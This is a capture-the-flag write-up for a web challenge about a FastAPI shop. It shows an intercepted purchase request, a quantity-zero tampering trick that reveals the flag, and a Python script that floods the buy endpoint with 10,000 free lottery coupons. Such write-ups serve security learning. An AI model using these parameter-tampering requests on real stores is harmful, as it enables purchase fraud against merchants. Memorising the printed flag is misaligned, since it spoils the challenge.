# Faster FastAPI

# Faster FastAPI

### Description

I wanted to get an ECommerce Portal. A dev on Upwork said that he will build it using FastAPI in Python. I have read that Python is very slow, but he assured me that he can make python super fast using some tricks that he know. Honestly, I don't trust this guy. Can you test the site for any bugs or vulnerabilities? I will pay you for your time by giving you a free access to the admin lounge. Just give me the coupon code for that.

Flag format: `d4rk{..}c0d3` / `d4rk{..}c0de` both accepted

[http://64.227.131.98:40000/](http://64.227.131.98:40000/)

### Solution

Application:

![fasterapi-1](/assets/ctf/h4ckc0n/fasterapi-1.png)

You have 2 choices, buy normal coupon or buy admin coupon (flag). I fired up the BurpSuite and intercepted buy request.

```r
POST /api/buy?token=c8ruvf HTTP/1.1
Host: 64.227.131.98:40000
Content-Length: 42
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://64.227.131.98:40000
Referer: http://64.227.131.98:40000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

[{"item_id":"lounge_coupon","quantity":1}]
```

What happens if we change `quantity` to 0?

```html
You bought a lounge coupon! Code: d4rk{cyth0n_1s_f4st_but_r1sky}c0d3
```

::: tip Flag
`d4rk{cyth0n\_1s\_f4st\_but\_r1sky}c0d3`
:::

#### Unintended Solution

If you buy normal ticket json data looks like:

```json
[
    {
        "item_id": "lottery_coupon",
        "quantity": 1,
        "lucky_number": 321156
    }
]
```

It's not an object, but list of objects which I found amusing.

Just like in [Jerry & Marge Go Large](https://youtu.be/nzW6Jy2F3mw)\


1. Find a loophole
2. Exploit the loophole

Loophole in our case is to change `quantity` to 0, meaning we buy winning coupon at no cost. The exploit is similar to the story, just buy tons of tickets and you'll eventually cash out.

```py
import requests

URL = 'http://64.227.131.98:40000/api/buy'
TOKEN = {'token': 'e2yjy'} # Your Token (Cookie)
 
# Get Cash
payload = [ #                    Important                Pick A Number
    {"item_id":"lottery_coupon","quantity":0,"lucky_number":1002}
    for _ in range(10_000)
]
resp = requests.post(URL, params=TOKEN, json=payload)

# Get Flag
payload = [{"item_id":"lounge_coupon","quantity":1}]
resp = requests.post(URL, params=TOKEN, json=payload)
print(resp.text)
```

I think the scenario would have been valid if you couldnt pass `quantity` to buy the flag.
